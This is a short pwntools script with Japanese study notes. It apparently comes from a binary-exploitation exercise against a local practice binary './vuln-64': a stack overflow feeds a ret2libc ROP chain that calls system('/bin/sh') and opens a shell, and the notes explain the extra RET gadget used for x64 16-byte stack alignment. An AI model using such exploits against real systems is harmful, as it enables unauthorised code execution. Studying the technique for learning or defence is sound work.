from pwn import *
import sys

p = process('./vuln-64')

libc_base = 0x7ffff7dab000
system = libc_base + 0x51c30
bin_sh = libc_base + 0x1afe43

POP_RDI = 0x4011cb

# アライメントの都合でこれを追加する
RET = 0x401016

payload = b'A' * 72
payload += p64(RET)
payload += p64(POP_RDI) # これも追加する
payload += p64(bin_sh)
payload += p64(system)
payload += p64(0x0)


if len(payload) % 16 != 0:
    sys.stderr.write("payload is not aligned")
    exit()



p.clean()
p.sendline(payload)
p.interactive()

# 結論 : x64ならスタックを16バイト境界に整列さないとセグフォ。payloadが16で割り切れればよし

# RETを追加しない場合、
# POP_RDIによって8バイトのリターンアドレスがセットされ、rspが8バイト加算される
# しかしx64は16バイト境界に整列している必要があり、現在のままでは16バイトアライメントされていないことになる
# そのためセグメンテーションフォルトで落ちる
# よって pop ripしてやればrspがまた8加算されて、結果16バイト境界に整列する

# まずリターンアドレスがret単体の命令があるアドレスに書き換わる
# もともとのretでスタックのretのアドレスが取られ、retが実行される
# スタック的にretの次はpop rdi; ret なのでpop rdi; ret が実行
# rdiにはbin_shが入り、retでsystemが実行
